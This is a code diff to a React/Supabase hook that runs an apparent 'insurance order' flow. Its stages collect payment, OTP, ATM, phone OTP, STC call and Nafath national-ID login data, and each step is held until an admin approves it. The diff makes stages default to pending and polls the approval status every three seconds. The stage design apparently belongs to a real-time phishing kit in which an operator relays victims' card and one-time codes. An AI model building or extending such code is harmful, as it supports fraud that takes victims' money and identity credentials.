@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect } from "react";
 import { supabase } from "@/integrations/supabase/client";
 
 type Stage = "payment" | "otp" | "atm" | "phone_verification" | "phone_otp" | "stc_call" | "nafath_login" | "nafath_verify";
@@ -7,26 +7,10 @@ type StageStatus = "pending" | "approved" | "rejected";
 export const useAdminApproval = (orderId: string | null, stage: Stage) => {
   const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("waiting");
 
-  const checkStatus = useCallback(async () => {
-    if (!orderId) return;
-    const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;
-    if (!visitorSid) return;
-    const { data } = await supabase.rpc("get_own_order", {
-      p_visitor_session_id: visitorSid,
-      p_order_id: orderId,
-    });
-    const order = data as any;
-    if (order?.current_stage === stage) {
-      if (order.stage_status === "approved") setStatus("approved");
-      else if (order.stage_status === "rejected") setStatus("rejected");
-    }
-  }, [orderId, stage]);
-
   useEffect(() => {
     if (!orderId) return;
 
-    // Immediate check
-    checkStatus();
+    const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;
 
     const channel = supabase
       .channel(`order-stage-${orderId}`)
@@ -48,13 +32,26 @@ export const useAdminApproval = (orderId: string | null, stage: Stage) => {
       )
       .subscribe();
 
-    const interval = setInterval(checkStatus, 1500);
+    const interval = setInterval(async () => {
+      // Use secure RPC to read order status (bypasses RLS for anon users)
+      if (visitorSid) {
+        const { data } = await supabase.rpc("get_own_order", {
+          p_visitor_session_id: visitorSid,
+          p_order_id: orderId,
+        });
+        const order = data as any;
+        if (order?.current_stage === stage) {
+          if (order.stage_status === "approved") setStatus("approved");
+          else if (order.stage_status === "rejected") setStatus("rejected");
+        }
+      }
+    }, 3000);
 
     return () => {
       supabase.removeChannel(channel);
       clearInterval(interval);
     };
-  }, [orderId, stage, checkStatus]);
+  }, [orderId, stage]);
 
   return status;
 };
@@ -68,14 +65,15 @@ export const createOrUpdateStage = async (
 
   const stageData: Record<string, any> = {
     current_stage: stage,
-    stage_status: "approved",
+    stage_status: "pending",
     ...extraData,
   };
-  const resolvedStageStatus = (stageData.stage_status as StageStatus | undefined) ?? "approved";
+  const resolvedStageStatus = (stageData.stage_status as StageStatus | undefined) ?? "pending";
 
   let resolvedOrderId = orderId;
 
   if (orderId) {
+    // Use RPC for secure update
     const { error } = await supabase.rpc("upsert_insurance_order", {
       p_visitor_session_id: visitorSid || "",
       p_order_id: orderId,
@@ -83,6 +81,7 @@ export const createOrUpdateStage = async (
     });
     if (error) throw error;
   } else {
+    // Use RPC for secure insert
     const { data, error } = await supabase.rpc("upsert_insurance_order", {
       p_visitor_session_id: visitorSid || "",
       p_data: { status: "pending", ...stageData },
